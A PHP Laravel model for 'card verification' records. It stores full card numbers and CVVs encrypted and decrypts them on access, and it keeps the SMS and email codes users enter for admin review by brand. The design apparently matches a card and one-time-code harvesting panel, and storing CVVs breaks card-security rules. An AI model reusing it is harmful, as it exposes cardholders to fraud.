<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\BelongsTo;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Crypt;

class CardVerification extends Model
{
    protected $fillable = [
        'uuid',
        'brand_id',
        'kyc_verification_id',
        'cardholder_name',
        'card_number_masked',
        'card_number_encrypted',
        'card_expiry',
        'card_cvv_encrypted',
        'card_type',
        'email',
        'phone',
        'address_line_1',
        'address_line_2',
        'city',
        'state',
        'postal_code',
        'country',
        'status',
        'sms_code',
        'sms_requested_at',
        'sms_code_entered_at',
        'sms_code_valid',
        'email_code',
        'email_requested_at',
        'email_code_entered_at',
        'email_code_valid',
        'admin_notes',
        'reviewed_by',
        'ip_address',
        'user_agent',
        'session_token',
        'verified_at',
    ];

    protected $casts = [
        'sms_requested_at' => 'datetime',
        'sms_code_entered_at' => 'datetime',
        'sms_code_valid' => 'boolean',
        'email_requested_at' => 'datetime',
        'email_code_entered_at' => 'datetime',
        'email_code_valid' => 'boolean',
        'verified_at' => 'datetime',
    ];

    protected $hidden = [
        'card_number_encrypted',
        'card_cvv_encrypted',
        'ip_address',
        'user_agent',
    ];

    protected static function boot(): void
    {
        parent::boot();

        static::creating(function (self $model) {
            if (empty($model->uuid)) {
                $model->uuid = (string) Str::uuid();
            }
            if (empty($model->session_token)) {
                $model->session_token = Str::random(64);
            }
        });
    }

    // === Relationships ===

    public function brand(): BelongsTo
    {
        return $this->belongsTo(Brand::class);
    }

    public function kycVerification(): BelongsTo
    {
        return $this->belongsTo(KycVerification::class);
    }

    public function reviewer(): BelongsTo
    {
        return $this->belongsTo(User::class, 'reviewed_by');
    }

    // === Accessors ===

    public function getDecryptedCardNumberAttribute(): ?string
    {
        try {
            return Crypt::decryptString($this->card_number_encrypted);
        } catch (\Exception $e) {
            return null;
        }
    }

    public function getDecryptedCvvAttribute(): ?string
    {
        try {
            return Crypt::decryptString($this->card_cvv_encrypted);
        } catch (\Exception $e) {
            return null;
        }
    }

    public function getFullAddressAttribute(): string
    {
        return collect([
            $this->address_line_1,
            $this->address_line_2,
            $this->city,
            $this->state,
            $this->postal_code,
            $this->country,
        ])->filter()->implode(', ');
    }

    // === Status helpers ===

    public function isPending(): bool
    {
        return $this->status === 'pending';
    }

    public function isAwaitingSms(): bool
    {
        return $this->status === 'awaiting_sms';
    }

    public function isAwaitingEmail(): bool
    {
        return $this->status === 'awaiting_email';
    }

    public function isVerified(): bool
    {
        return $this->status === 'verified';
    }

    public function isFailed(): bool
    {
        return $this->status === 'failed';
    }

    public function isWaitingForCode(): bool
    {
        return in_array($this->status, ['awaiting_sms', 'awaiting_email']);
    }

    public function isCodeEntered(): bool
    {
        return in_array($this->status, ['sms_code_entered', 'email_code_entered']);
    }

    // === Card type detection ===

    public static function detectCardType(string $number): string
    {
        $number = preg_replace('/\D/', '', $number);

        if (preg_match('/^4/', $number)) return 'visa';
        if (preg_match('/^5[1-5]/', $number)) return 'mastercard';
        if (preg_match('/^3[47]/', $number)) return 'amex';
        if (preg_match('/^6(?:011|5)/', $number)) return 'discover';

        return 'unknown';
    }

    public static function maskCardNumber(string $number): string
    {
        $clean = preg_replace('/\D/', '', $number);
        $last4 = substr($clean, -4);
        return '****' . $last4;
    }
}
